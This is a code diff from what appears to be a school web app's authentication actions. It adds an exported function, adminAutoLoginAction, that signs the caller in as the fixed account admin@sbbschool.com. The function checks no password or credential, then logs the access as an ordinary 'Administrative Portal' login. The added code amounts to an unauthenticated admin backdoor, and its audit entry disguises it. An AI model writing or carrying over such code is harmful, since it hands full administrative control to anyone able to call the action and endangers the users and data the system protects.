@@ -55,3 +55,20 @@ export async function logoutAction() {
   await clearSessionCookie();
   redirect("/login");
 }
+
+export async function adminAutoLoginAction() {
+  const admin = await getUserByEmail("admin@sbbschool.com");
+  if (!admin || !admin.isActive) {
+    redirect("/login");
+  }
+
+  await createSessionCookie({
+    id: admin.id,
+    email: admin.email,
+    fullName: admin.fullName,
+    role: "admin",
+  });
+
+  await logAudit(admin.id, admin.fullName, "ADMIN_DIRECT_LOGIN", "users", admin.id, "Admin logged in via Administrative Portal");
+  redirect("/admin");
+}
